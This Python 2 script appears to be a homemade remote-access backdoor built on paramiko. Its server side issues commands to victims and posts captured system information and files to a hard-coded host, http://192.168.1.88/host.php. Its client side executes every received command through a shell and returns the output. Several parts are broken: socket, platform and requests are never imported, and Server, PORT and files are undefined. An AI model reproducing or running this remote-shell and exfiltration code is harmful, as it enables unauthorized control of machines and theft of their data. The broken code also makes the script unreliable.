#!/usr/bin/python
# -*- coding: utf-8 -*-

import paramiko
import sys
import getopt
import subprocess

def ssh_server():
	host_key = paramiko.RSAKey(filename='test_rsa.key')
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		sock.bind(("127.0.0.1", PORT))
		sock.listen(100)
		print "[+] Waiting for connection..."
		client, addr = sock.accept()
	except Exception as ex:
		print "[-] Exception while ssh_server sock initialization: " + str(ex)
		return False
	print "[+] Client connected!"
	try:
		transport = paramiko.Transport(client)
		transport.add_server_key(host_key)
		server = Server()
		try:
			transport.start_server(server=server)
		except paramiko.SSHException as ex:
			print "[-] Exception SSH negotiation"
		channel = transport.accept(20)
		print "[+] Authenticated"
		channel.send("[<<!!<<] Server Ready [>>!!>>]")
		print '[<!>] Caution: \n\tFor commands like \'cd\',\'mkdir\' use multiple command syntax:\n\t\texample: cd ..; pwd'
		command_console(channel)
		transport.close()
	except Exception as ex:
		print "[-] Exception caught: " + str(ex)
		try:
			transport.close()
		except Exception as ex:
			print "[-] Exception while closing transport"
			return False
			
def command_console(channel):	
	while True:
		try:
			command = raw_input("Enter command: ").strip('\n')
			if command[:11] == 'grab_screen':
				if grab_screen():
					file_pathname = command[12:]
					print "[+] File namepath: " + file_pathname
					files = {'file':open(file_pathname,'rb')}
					channel.send("[+] Screen captured and sent...")
				else:
					channel.send("[-] Operation Failed")
			elif command == 'get_sys_info':
				data = ""
				for n in platform.uname():
					data += n + " || "
				requests.post('http://192.168.1.88/host.php', data = {'key':'abc','sys':data})
			elif command[:8] == "get_file":
				requests.post('http://192.168.1.88/host.php', data={'':'bb','sys':'bb'}, files=files)
			elif command == 'exit':
				channel.send('exit')
				print "[*] Exiting SSH..."
				return False
			else:
				channel.send(command)
				print channel.recv(1024) + '\n'
		except KeyboardInterrupt:
			return False


def usage():
    print "Usage: ssh_client.py  <IP> -p <PORT> -u <USER> -c <COMMAND> -a <PASSWORD>"
    print "  -a                  password authentication"
    print "  -p                  specify the port"
    print "  -u                  specify the username"
    print
    print "Examples:"
    print "ssh_client.py localhost -u buffy -p 22 -a killvampires"
    sys.exit()

def ssh_client(ip, port, user, passwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        print ssh_session.recv(1024)
        while 1:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception, e:
                ssh_session.send(str(e))
        client.close()

def main():
    if not len(sys.argv[1:]):
        usage()
    IP = '0.0.0.0'
    USER = ''
    PASSWORD = ''
    PORT = 0
    try:
        opts = getopt.getopt(sys.argv[2:],"p:u:a:", \
            ["PORT", "USER", "PASSWORD"])[0]
    except getopt.GetoptError as err:
        print str(err)
        usage()
    IP = sys.argv[1]
    print "[*] Initializing connection to " + IP
    for t in opts:
        if t[0] in ('-a'):
            PASSWORD = t[1]
        elif t[0] in ('-p'):
            PORT = int(t[1])
        elif t[0] in ('-u'):
            USER = t[1]
        else:
            print "This option does not exist!"
            usage()
    if USER:
        print "[*] User set to " + USER
    if PORT:
        print "[*] The port to be used is %d. " % PORT
    if PASSWORD:
        print "[*] A password with length %d was submitted. " %len(PASSWORD)
    ssh_client(IP, PORT, USER, PASSWORD)

if __name__ == '__main__':
    main()

